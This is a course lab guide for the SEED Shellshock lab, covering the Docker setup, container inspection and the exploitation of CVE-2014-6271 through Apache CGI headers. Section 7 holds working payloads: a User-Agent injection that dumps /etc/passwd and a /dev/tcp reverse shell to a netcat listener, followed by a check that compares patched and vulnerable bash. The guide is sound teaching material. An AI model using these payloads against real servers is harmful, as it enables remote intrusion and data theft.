# Lab 05 — Shellshock Vulnerability Lab

Official Reference: https://seedsecuritylabs.org/Labs_20.04/Web/Shellshock/  
Textbook Reference: Chapter 3 — Environment Variable and Set-UID Programs (*Computer & Internet Security*, Prof. Wenliang Du)  
CVE References: CVE-2014-6271, CVE-2014-7169

For authorized educational use only.

---

## 1. Security Concept

The Shellshock vulnerability (CVE-2014-6271) affects GNU Bash versions up to 4.3. Bash allows function definitions to be exported across environment variables. Due to a parsing defect, vulnerable Bash versions fail to stop parsing after evaluating trailing function definitions, improperly executing any trailing commands appended to environment variables.

In a web application context, Apache CGI (Common Gateway Interface) passes incoming HTTP request headers (such as `User-Agent`, `Referer`, and `Cookie`) as environment variables (`HTTP_USER_AGENT`, `HTTP_REFERER`, `HTTP_COOKIE`) to the CGI script shell interpreter (`/bin/bash_shellshock`), enabling Remote Code Execution (RCE).

---

## 2. Standard 14-Step Learning Sequence

```
STEP 1  Understand Security Concept  (Bash function export parsing flaw -> RCE via CGI headers)
STEP 2  Understand Lab Architecture (Client -> Apache CGI -> /bin/bash_shellshock)
STEP 3  Understand Docker Architecture (shellshock-10.9.0.80 on net-10.9.0.0-shellshock)
STEP 4  Start Containers            (docker compose up -d)
STEP 5  Inspect Docker               (docker compose ps, status.sh)
STEP 6  Enter Linux Containers       (docker exec -it shellshock-10.9.0.80 bash)
STEP 7  Inspect Linux Environment    (pwd, ls -la, ps aux, whoami, id, hostname, ip addr, env)
STEP 8  Inspect Application          (Examine /usr/lib/cgi-bin/vul.cgi & safe.cgi)
STEP 9  Complete Official Lab Tasks  (Exfiltrate /etc/passwd & establish reverse shell)
STEP 10 Inspect Logs                 (tail -f /var/log/apache2/access.log)
STEP 11 Understand Root Cause        (Review trailing command execution after function strings)
STEP 12 Implement Countermeasure     (Compare patched /bin/bash vs vulnerable /bin/bash_shellshock)
STEP 13 Stop and Reset               (docker compose down)
STEP 14 Document Learning            (Record HTTP header payloads and execution logs)
```

---

## 3. Environment & Architecture Diagrams

### Multi-Layer Container Architecture

```
+-------------------------------------------------------------------------+
|                              HOST MACHINE                               |
|                                                                         |
|  Host Browser / curl: http://www.seedlab-shellshock.com/cgi-bin/vul.cgi|
|                       (via /etc/hosts -> 10.9.0.80)                     |
|  Mapped Host Port: 10086 -> Container Port 80                           |
|                                                                         |
|  +-------------------------------------------------------------------+  |
|  |                          DOCKER ENGINE                            |  |
|  |                                                                   |  |
|  |  Docker Bridge Network: net-10.9.0.0-shellshock (10.9.0.0/24)   |  |
|  |                                                                   |  |
|  |  +-------------------------------------------------------------+  |  |
|  |  | CGI Web Container: shellshock-10.9.0.80                      |  |  |
|  |  | (10.9.0.80:10086)                                           |  |  |
|  |  |                                                             |  |  |
|  |  | +---------------------------------------------------------+ |  |  |
|  |  | | Linux User Space                                        | |  |  |
|  |  | | Apache 2.4 CGI Engine                                 | |  |  |
|  |  | | /usr/lib/cgi-bin/vul.cgi  (uses /bin/bash_shellshock)   | |  |  |
|  |  | | /usr/lib/cgi-bin/safe.cgi (uses /bin/bash - patched)    | |  |  |
|  |  | +---------------------------------------------------------+ |  |  |
|  |  +-------------------------------------------------------------+  |  |
|  +-------------------------------------------------------------------+  |
+-------------------------------------------------------------------------+
```

### Security Data-Flow Diagram

```
1. Attacker sends HTTP GET with User-Agent payload:
   curl -A "() { :;}; echo Content-Type: text/plain; echo; /bin/cat /etc/passwd" \
        http://www.seedlab-shellshock.com/cgi-bin/vul.cgi
      |
      v
2. Apache CGI maps User-Agent header to environment variable:
   HTTP_USER_AGENT="() { :;}; echo Content-Type: text/plain; echo; /bin/cat /etc/passwd"
      |
      v
3. Apache invokes CGI shebang: #!/bin/bash_shellshock
      |
      v
4. Vulnerable /bin/bash_shellshock initializes, parses function definition,
   and improperly executes trailing command /bin/cat /etc/passwd
      |
      v
5. Content of /etc/passwd is returned to attacker in HTTP response stream
```

---

## 4. Docker Learning Matrix

| Docker Concept | Lab Specific Implementation | Function |
|----------------|-----------------------------|----------|
| **Base Image** | `handsonsecurity/seed-image-www-shellshock` | Contains Apache CGI server and vulnerable/patched Bash binaries |
| **Container** | `shellshock-10.9.0.80` | Running CGI container instance |
| **Bridge Network** | `net-10.9.0.0-shellshock` | Subnet `10.9.0.0/24` isolating Shellshock traffic |
| **Port Binding** | `10086:80` | Forwards host port 10086 to container Apache port 80 |

---

## 5. Linux Learning Inside the Containers

To enter the Shellshock container shell:
```bash
docker exec -it shellshock-10.9.0.80 bash
```

### Linux Inspection Commands

1. **`pwd`**
   - *What*: Displays working directory (`/var/www/html`).
   - *Why*: Confirms directory position inside container.
   - *Lab Application*: Verify location before checking CGI directories.

2. **`ls -la /usr/lib/cgi-bin/`**
   - *What*: Lists CGI binaries and permissions.
   - *Why*: Locates script targets (`vul.cgi` and `safe.cgi`).
   - *Lab Application*: Verify execution permissions (`+x`) on CGI scripts.

3. **`cat /usr/lib/cgi-bin/vul.cgi`**
   - *What*: Concatenates and prints CGI file content.
   - *Why*: Inspects shebang line header.
   - *Lab Application*: Confirm `vul.cgi` uses `#!/bin/bash_shellshock`.

4. **`whoami` and `id`**
   - *What*: Returns user identity (`root`).
   - *Why*: Confirms container shell privileges.
   - *Lab Application*: Contrast interactive root shell with `www-data` CGI process execution.

5. **`hostname` and `ip addr`**
   - *What*: Displays container hostname and IP address (`10.9.0.80`).
   - *Why*: Verifies network interface assignment.
   - *Lab Application*: Confirm container IP matches `www.seedlab-shellshock.com` mapping.

6. **`ps aux`**
   - *What*: Displays process list.
   - *Why*: Inspects active Apache daemon processes.
   - *Lab Application*: Verify Apache service status.

7. **`env` and `export`**
   - *What*: Displays and exports shell variables.
   - *Why*: Tests function export mechanisms directly.
   - *Lab Application*: Run `export foo='() { :;}; echo VULNERABLE'` to test Bash parsing.

---

## 6. Official Lab Tasks

Download official PDF handout: https://seedsecuritylabs.org/Labs_20.04/Web/Shellshock/

- **Task 1**: Pass environment variables containing function definitions directly to Bash binaries.
- **Task 2A**: Exfiltrate server data (`/etc/passwd`) via HTTP User-Agent header injection against `vul.cgi`.
- **Task 2B**: Test alternative HTTP headers (`Referer`, `Cookie`) passed by CGI.
- **Task 3**: Establish a reverse shell from container back to host netcat listener.
- **Task 4**: Compare vulnerability behavior between `vul.cgi` (`bash_shellshock`) and `safe.cgi` (patched `bash`).

---

## 7. Exploitation & Remediation

### Data Exfiltration Payload
```bash
curl -A "() { :;}; echo Content-Type: text/plain; echo; /bin/cat /etc/passwd" \
     http://www.seedlab-shellshock.com/cgi-bin/vul.cgi
```

### Reverse Shell Payload
Host listener:
```bash
nc -l -v 9090
```
Payload execution:
```bash
curl -A "() { :;}; /bin/bash -i >& /dev/tcp/10.9.0.1/9090 0>&1" \
     http://www.seedlab-shellshock.com/cgi-bin/vul.cgi
```

### Remediation (Patched Binary Verification)
Inside container:
```bash
# Vulnerable binary: executes trailing command
/bin/bash_shellshock -c "x='() { :;}; echo VULNERABLE' bash -c :"

# Patched binary: ignores trailing command
/bin/bash -c "x='() { :;}; echo VULNERABLE' bash -c :"
```

---

## 8. Stop and Reset

```bash
docker compose down        # Stop containers
```
